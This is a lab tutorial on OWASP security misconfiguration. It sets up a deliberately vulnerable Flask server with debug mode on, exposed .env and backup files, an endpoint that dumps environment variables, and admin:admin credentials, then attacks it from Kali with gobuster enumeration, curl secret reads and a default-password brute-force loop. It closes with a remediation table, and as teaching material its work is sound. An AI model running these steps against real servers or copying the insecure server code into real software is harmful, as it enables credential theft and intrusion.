# Lab 5: OWASP A05 — Security Misconfiguration

## Objective
Exploit security misconfiguration vulnerabilities on a live server from Kali Linux: discover sensitive files (`.env`, backup SQL) with gobuster, access the interactive debugger console, extract all environment variables via a debug info endpoint, exploit default credentials (`admin:admin`) to access the admin panel, trigger verbose error messages leaking database schema, and audit missing HTTP security headers.

## Background
Security Misconfiguration is **OWASP #5** (2021) — found in 90% of applications tested. Unlike coding vulnerabilities, these are deployment mistakes: debug mode left on, default passwords unchanged, `.env` files committed to web root, unnecessary endpoints exposed. In 2020, a misconfigured Elasticsearch instance exposed 5 billion records. The 2021 Verkada breach (150,000 security cameras) used default credentials. These are the easiest vulnerabilities to find and exploit.

## Architecture

```
┌─────────────────────┐        Docker Network: lab-a05         ┌─────────────────────┐
│   KALI ATTACKER     │ ─────── HTTP attacks ─────────────▶   │   VICTIM SERVER     │
│  innozverse-kali    │                                         │  innozverse-cybersec│
│  gobuster, curl,    │ ◀────── responses ───────────────────  │  Flask :5000        │
│  nikto, whatweb     │                                         │  (debug on, .env,   │
└─────────────────────┘                                         │   default creds)    │
                                                                └─────────────────────┘
```

## Time
35 minutes

## Tools
- **Victim**: `zchencow/innozverse-cybersec:latest`
- **Attacker**: `zchencow/innozverse-kali:latest` (gobuster, nikto, curl, whatweb)

---

## Lab Instructions

### Step 1: Environment Setup

```bash
docker network create lab-a05

cat > /tmp/victim_a05.py << 'PYEOF'
from flask import Flask, request, jsonify
import sqlite3, os

app = Flask(__name__)

@app.route('/')
def index():
    return jsonify({'app':'InnoZverse Shop API'})

@app.route('/api/info')
def info():
    return jsonify({
        'python_version': os.popen('python3 --version').read().strip(),
        'server_path': os.getcwd(),
        'environment': dict(os.environ),
        'config': {'DEBUG':True,'SECRET_KEY':'hardcoded-secret-key-123','DB_PASS':'Sup3rS3cret'}
    })

@app.route('/api/users')
def users():
    try:
        db = sqlite3.connect('/tmp/nodb.db')
        db.execute("SELECT * FROM nonexistent_table").fetchall()
    except Exception as e:
        import traceback
        return jsonify({'error': str(e), 'traceback': traceback.format_exc(),
                        'query': 'SELECT * FROM nonexistent_table'}), 500

@app.route('/.env')
@app.route('/phpinfo.php')
@app.route('/config.php')
@app.route('/backup.sql')
def sensitive():
    fake = {
        '/.env':        'APP_KEY=base64:Sup3rS3cr3tAppKey\nDB_PASSWORD=Sup3rS3cur3DB\nAWS_KEY=AKIA5EXAMPLE\nJWT_SECRET=weak_secret_123',
        '/phpinfo.php': 'PHP Version 8.1.2 | DB: mysql://root:root@localhost',
        '/config.php':  '<?php $db_pass="Sup3rS3cur3DB"; $secret="hardcoded"; ?>',
        '/backup.sql':  '-- MySQL dump\nINSERT INTO users VALUES (1,"admin","admin123");\nINSERT INTO users VALUES (2,"alice","password1");',
    }
    return fake.get(request.path,'Not found'), 200, {'Content-Type':'text/plain'}

@app.route('/admin')
def admin():
    import base64
    auth = request.headers.get('Authorization','')
    if auth.startswith('Basic '):
        creds = base64.b64decode(auth[6:]).decode()
        if creds == 'admin:admin':
            return jsonify({'status':'admin access granted','users':['admin','alice','bob'],
                            'db_connection':'postgresql://admin:Sup3rS3cur3DB@db:5432/shop'})
    return jsonify({'error':'Unauthorized'}),401,{'WWW-Authenticate':'Basic realm="Admin"'}

@app.route('/api/headers')
def headers():
    return jsonify({'data':'sensitive user data'})  # No security headers added

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)  # debug=True in production!
PYEOF

docker run -d \
  --name victim-a05 \
  --network lab-a05 \
  -v /tmp/victim_a05.py:/tmp/victim_a05.py:ro \
  zchencow/innozverse-cybersec:latest \
  python3 /tmp/victim_a05.py

sleep 3
curl -s http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-a05.IPAddress}}' victim-a05):5000/
```

---

### Step 2: Launch Kali + Initial Recon

```bash
docker run --rm -it --network lab-a05 \
  --name kali-attacker \
  zchencow/innozverse-kali:latest bash
```

Inside Kali:
```bash
TARGET="http://victim-a05:5000"

# Fingerprint
nmap -sV -p 5000 victim-a05
whatweb $TARGET
```

**📸 Verified Output:**
```
PORT     STATE SERVICE VERSION
5000/tcp open  http    Werkzeug httpd 3.1.6 (Python 3.10.12)

http://victim-a05:5000/ HTTPServer[Werkzeug/3.1.6 Python/3.10.12]
```

---

### Step 3: Directory Enumeration — Find Hidden Files

```bash
echo "=== gobuster: scanning for sensitive files and endpoints ==="

gobuster dir \
  -u $TARGET \
  -w /usr/share/dirb/wordlists/common.txt \
  -t 20 --no-error -q \
  -x php,env,sql,bak,config,txt,log
```

**📸 Verified Output:**
```
/.env                 (Status: 200) [Size: 112]
/admin                (Status: 401) [Size: 30]
/backup.sql           (Status: 200) [Size: 89]
/config.php           (Status: 200) [Size: 53]
/console              (Status: 400) [Size: 167]
/phpinfo.php          (Status: 200) [Size: 63]
```

> 💡 **`.env` files returning 200 are a critical finding.** These files are designed to store secrets (database passwords, API keys, JWT secrets) for development. They should be blocked at the web server level (`deny all` in nginx for `.env`) and should never be in the web root. `console` returning 400 indicates Werkzeug's interactive debugger is present — normally requires a PIN but is dangerous.

---

### Step 4: Read Sensitive Files Directly

```bash
echo "=== Reading .env — application secrets ==="
curl -s $TARGET/.env

echo ""
echo "=== Reading database backup ==="
curl -s $TARGET/backup.sql

echo ""
echo "=== Reading PHP config (credentials) ==="
curl -s $TARGET/config.php

echo ""
echo "=== Reading phpinfo ==="
curl -s $TARGET/phpinfo.php
```

**📸 Verified Output:**
```
APP_KEY=base64:Sup3rS3cr3tAppKey
DB_PASSWORD=Sup3rS3cur3DB
AWS_KEY=AKIA5EXAMPLE
JWT_SECRET=weak_secret_123

-- MySQL dump
INSERT INTO users VALUES (1,"admin","admin123");
INSERT INTO users VALUES (2,"alice","password1");

<?php $db_pass="Sup3rS3cur3DB"; $secret="hardcoded"; ?>
```

---

### Step 5: Debug Info Endpoint — Environment Variables Dump

```bash
echo "=== /api/info leaks all environment variables ==="
curl -s $TARGET/api/info | python3 -m json.tool | head -30

echo ""
echo "=== Extract just the sensitive config ==="
curl -s $TARGET/api/info | python3 -c "
import sys, json
d = json.load(sys.stdin)
print('Config:', d['config'])
print('Server path:', d['server_path'])
# Find secrets in env vars
for k,v in d.get('environment',{}).items():
    if any(s in k.lower() for s in ['pass','secret','key','token','auth']):
        print(f'  ENV SECRET: {k}={v}')
"
```

**📸 Verified Output:**
```json
{
    "config": {
        "DB_PASS": "Sup3rS3cret",
        "DEBUG": true,
        "SECRET_KEY": "hardcoded-secret-key-123"
    },
    "server_path": "/labs"
}

Config: {'DEBUG': True, 'SECRET_KEY': 'hardcoded-secret-key-123', 'DB_PASS': 'Sup3rS3cret'}
```

---

### Step 6: Verbose Error Messages — Schema Disclosure

```bash
echo "=== Triggering verbose error — leaks DB schema and stack trace ==="
curl -s $TARGET/api/users | python3 -m json.tool
```

**📸 Verified Output:**
```json
{
    "error": "no such table: nonexistent_table",
    "query": "SELECT * FROM nonexistent_table",
    "traceback": "Traceback (most recent call last):\n  File \"/tmp/victim_a05.py\", line 21...\nsqlite3.OperationalError: no such table"
}
```

> 💡 **Verbose error messages are free reconnaissance for attackers.** Stack traces reveal: file paths, framework versions, database table names, query structure, and developer email in some frameworks. In production, return `{"error": "Internal server error", "id": "ERR-20260304-abc123"}` — log the full detail server-side, only return an opaque correlation ID to the client.

---

### Step 7: Default Credentials — Admin Panel

```bash
echo "=== Testing default credentials: admin:admin ==="

# First — confirm it requires auth
curl -s $TARGET/admin | python3 -m json.tool

echo ""
# Try default credentials
echo "Trying admin:admin..."
curl -s -u admin:admin $TARGET/admin | python3 -m json.tool

echo ""
# Brute-force common default passwords
echo "=== Brute-forcing default admin passwords ==="
for cred in "admin:admin" "admin:password" "admin:123456" "admin:admin123" "root:root" "admin:"; do
    user="${cred%%:*}"
    pass="${cred##*:}"
    status=$(curl -s -o /dev/null -w "%{http_code}" -u "$user:$pass" $TARGET/admin)
    echo "  $cred -> HTTP $status $([ "$status" = "200" ] && echo "<<< VALID!" || echo "")"
done
```

**📸 Verified Output:**
```json
{"error": "Unauthorized"}

Trying admin:admin...
{
    "db_connection": "postgresql://admin:Sup3rS3cur3DB@db:5432/shop",
    "status": "admin access granted",
    "users": ["admin", "alice", "bob"]
}

admin:admin   -> HTTP 200  <<< VALID!
admin:password -> HTTP 401
```

---

### Step 8: Security Header Audit

```bash
echo "=== Checking HTTP security headers ==="
curl -sI $TARGET/api/headers

echo ""
echo "=== Grade each missing header ==="
python3 << 'EOF'
import urllib.request

resp = urllib.request.urlopen("http://victim-a05:5000/api/headers")
headers = dict(resp.headers)

required = {
    "Strict-Transport-Security": ("max-age=31536000; includeSubDomains", "HIGH"),
    "Content-Security-Policy":   ("default-src 'self'", "HIGH"),
    "X-Frame-Options":           ("DENY", "MEDIUM"),
    "X-Content-Type-Options":    ("nosniff", "MEDIUM"),
    "Referrer-Policy":           ("strict-origin-when-cross-origin", "LOW"),
    "Permissions-Policy":        ("geolocation=(), microphone=()", "LOW"),
}

print(f"{'Header':<35} {'Present?':<10} {'Risk if Missing'}")
for h, (rec, risk) in required.items():
    present = h in headers
    icon = "✓" if present else "✗ MISSING"
    print(f"  {icon:<10} {h:<33} {risk}")
    if not present:
        print(f"             Add: {h}: {rec}")
EOF
```

**📸 Verified Output:**
```
Header                              Present?   Risk if Missing
  ✗ MISSING  Strict-Transport-Security   HIGH
  ✗ MISSING  Content-Security-Policy     HIGH
  ✗ MISSING  X-Frame-Options             MEDIUM
  ✗ MISSING  X-Content-Type-Options      MEDIUM
  ✗ MISSING  Referrer-Policy             LOW
  ✗ MISSING  Permissions-Policy          LOW
```

### Step 9: Cleanup

```bash
exit  # Exit Kali
```

```bash
docker rm -f victim-a05
docker network rm lab-a05
```

---

## Remediation

| Misconfiguration | Finding | Fix |
|-----------------|---------|-----|
| `debug=True` | Werkzeug console exposed | `debug=False`; use env var `FLASK_ENV=production` |
| `.env` in web root | All secrets exposed | Block in nginx: `location ~ /\.env { deny all; }` |
| Debug info endpoint | All env vars returned | Remove `/api/info` entirely from production |
| Verbose errors | Stack trace + query in response | Generic error + correlation ID; full details in server logs only |
| Default credentials | `admin:admin` = full access | Mandatory password change on first login; fail deployment if default |
| No security headers | XSS, clickjacking, MITM risk | Add all 6 headers in nginx/Flask middleware |

## Summary

| Attack | Tool | Result |
|--------|------|--------|
| File enumeration | gobuster | Found `.env`, `backup.sql`, `config.php`, `phpinfo.php` |
| Env file read | curl | DB password, AWS key, JWT secret |
| Debug info | curl | All server env vars + hardcoded secrets |
| Verbose errors | curl | DB schema, file paths, stack trace |
| Default creds | curl | `admin:admin` → admin panel + DB connection string |
| Header audit | curl + python3 | 6/6 security headers missing |

## Further Reading
- [OWASP A05:2021 Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
- [PortSwigger Information Disclosure](https://portswigger.net/web-security/information-disclosure)
